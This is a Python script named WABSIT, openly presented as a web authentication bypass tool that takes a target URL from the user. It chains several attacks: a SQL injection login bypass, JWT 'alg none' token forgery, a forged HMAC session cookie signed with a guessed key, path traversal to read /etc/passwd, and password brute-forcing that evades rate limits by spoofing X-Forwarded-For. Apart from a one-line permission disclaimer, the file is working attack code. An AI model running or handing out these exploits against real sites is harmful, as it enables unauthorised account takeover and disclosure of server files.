#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# WABSIT - Web Auth Bypass & Session Injection Tool (English comments)
# USE ONLY ON YOUR OWN SYSTEMS OR WITH WRITTEN PERMISSION.

import requests
import base64
import hashlib
import hmac
import json
import re
from urllib.parse import urlparse, parse_qs

class WabsitEngine:
    def __init__(self, target_url, proxy=None):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

    def fingerprint_auth(self, path='/login'):
        """Collect auth metadata"""
        resp = self.session.get(self.target + path, timeout=5)
        cookies = resp.cookies.get_dict()
        forms = re.findall(r'<form[^>]+action=["\']([^"\']+)["\']', resp.text)
        inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', resp.text)
        return {'cookies': cookies, 'forms': forms, 'inputs': inputs}

    def inject_session(self, user_id='1', role='admin', sig_key='secret'):
        """Generate forged session with HMAC"""
        payload = {'uid': user_id, 'role': role, 'exp': 9999999999}
        b64 = base64.b64encode(json.dumps(payload).encode()).decode()
        sig = hmac.new(sig_key.encode(), b64.encode(), hashlib.sha256).hexdigest()
        return f"{b64}.{sig}"

    def sqli_bypass(self, login_field='user', pass_field='pass'):
        """SQL injection payload for login form"""
        sqli_payload = f"{login_field}' OR '1'='1'--"
        data = {login_field: sqli_payload, pass_field: 'anything'}
        resp = self.session.post(self.target + '/login', data=data, allow_redirects=False)
        return resp.status_code, resp.headers.get('Location', '')

    def jwt_none_alg(self, token):
        """JWT algorithm none attack"""
        parts = token.split('.')
        if len(parts) != 3:
            return None
        header = json.loads(base64.b64decode(parts[0] + '==').decode())
        header['alg'] = 'none'
        new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
        return f"{new_header}.{parts[1]}."

    def csrf_token_steal(self, path='/dashboard'):
        """Extract CSRF token from HTML"""
        resp = self.session.get(self.target + path)
        match = re.search(r'csrf_token["\']?\s*value=["\']([^"\']+)["\']', resp.text)
        return match.group(1) if match else None

    def path_traversal(self, file='../../etc/passwd'):
        """Directory traversal via file= parameter"""
        params = {'file': file}
        resp = self.session.get(self.target + '/download', params=params)
        return resp.text if resp.status_code == 200 else None

    def rate_limit_crack(self, endpoint='/api/login', user_list=['admin'], pass_list=['123456']):
        """Rate limit bypass via IP header rotation"""
        for user in user_list:
            for pwd in pass_list:
                headers = {'X-Forwarded-For': f'192.168.1.{hash(pwd) % 255}'}
                resp = self.session.post(self.target + endpoint, 
                                         json={'username': user, 'password': pwd},
                                         headers=headers, timeout=2)
                if resp.status_code == 200 and 'success' in resp.text.lower():
                    return (user, pwd)
        return None

    def full_exploit_chain(self):
        """Full cycle: bypass → session → access"""
        info = self.fingerprint_auth()
        # SQLi attempt
        status, loc = self.sqli_bypass()
        if status == 302:
            return {'method': 'sqli', 'redirect': loc}
        # JWT none attempt
        jwt_cookie = info['cookies'].get('jwt') or info['cookies'].get('token')
        if jwt_cookie:
            fake = self.jwt_none_alg(jwt_cookie)
            if fake:
                self.session.cookies.set('jwt', fake)
                resp = self.session.get(self.target + '/admin')
                if resp.status_code == 200:
                    return {'method': 'jwt_none', 'access': True}
        # Forged session attempt
        sess = self.inject_session()
        self.session.cookies.set('session', sess)
        resp = self.session.get(self.target + '/profile')
        if resp.status_code == 200:
            return {'method': 'hmac_forgery', 'session': sess}
        return {'method': 'failed', 'info': info}

# Entry point
if __name__ == "__main__":
    target = input("Enter target URL (e.g. http://target.com): ")
    engine = WabsitEngine(target)
    result = engine.full_exploit_chain()
    print(json.dumps(result, indent=2))
